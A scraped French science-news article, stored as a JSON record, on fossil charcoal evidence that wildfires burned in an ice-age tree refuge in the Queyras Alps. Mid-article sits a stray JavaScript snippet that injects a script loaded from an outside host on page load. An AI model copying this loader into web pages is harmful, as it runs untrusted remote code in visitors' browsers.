{"title": "Etonnant : il y avait des feux de forets a l'ere glaciaire", "newspaper": "Futura Sciences", "author": ["CNRS"], "date_publi": "2017-09-19", "content": "Les incendies de forets attendent l'ete et la secheresse, ce qui parait logique. Pourtant une etude sur les feux de vegetation et la composition des boisements au cours des 20.000 dernieres annees a trouve des preuves d'incendies a 2.240 m d'altitude, pendant une epoque glaciaire. Les  incendies  de vegetation se propagent lorsque du  combustible  est disponible et que le  climat  est sec. Il est contre-intuitif d'imaginer de tels incendies en zones periglaciaires, subpolaires ou montagnardes. C'est pourtant ce que des sediments  lacustres  de haute montagne ont revele. Des incendies, certes rares, mais bien attestes par des  charbons  de  bois , y compris durant des epoques glaciaires et postglaciaires.  Des incendies ont pu avoir lieu sur le site du massif du  Queyras  (Alpes occidentales) car des  arbres  y ont survecu en pleine epoque glaciaire, comme en atteste la presence de macrorestes (feuilles et graines). Ce site a heberge un refuge  glaciaire  de pins cembro et de melezes en isolement, telle une ile au milieu d'un ocean de glace. Ces arbres en situation de refuge durant le dernier maximum glaciaire pourraient etre a l'origine des lignees  genetiques  de pins cembro et de melezes qui occupent aujourd'hui les vallees internes des Alpes occidentales.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un refuge glaciaire d'arbres sujet aux incendies dans les Alpes En outre, le regime de  feu  a change simultanement avec le changement de dominance de couvert d'arbre. Au debut de l' Holocene  (vers 10.700 ans) le climat devient plus chaud et plus humide : le pin cembro qui dominait en  periode glaciaire  (froide, seche), a faible  frequence  de  feu , a ete remplace par le meleze, associe a des incendies plus frequents. Cette etude internationale, conduite par Christopher Carcaillet, directeur d'etudes EPHE au Laboratoire d' ecologie  des hydrosystemes naturels et anthropises (CNRS/Universite Lyon 1/ENTPE) et  Olivier  Blarquez (universite de Montreal), est parue en ligne dans la revue  New Phytologist . Elle montre qu'un climat periglaciaire ne presume pas de l'absence d'incendies. Des arbres (ici le pin cembro) sont necessaires aux incendies en  haute montagne , et si le climat regule la frequence des feux, ces derniers, en retour, controlent la diversite des arbres. Cette etude fait echo aux recents incendies dans les  toundras  de l' Arctique , qui sont de plus en plus envahies par les arbres, avec des consequences importantes sur le cycle du  carbone , ce qui interpelle la communaute scientifique. Les changements de couvert boise en haute montagne sous l'effet du  rechauffement climatique , et surtout de la deprise agricole, risquent d'accentuer la propagation des feux dans les prochaines annees. Les tornades de feu, un phenomene rare et impressionnant                       Des pompiers aux prises avec un grand incendie de foret en Californie du Sud, aux Etats-Unis, voient se former autour d'eux des tourbillons enflammes. Ces tornades miniatures se creent par la chaleur qui engendre des mouvements d'air et sont soutenues par des vents violents. Elles soulevent des debris vegetaux en feu et ravagent les alentours.                                       ", "theme": "planete"}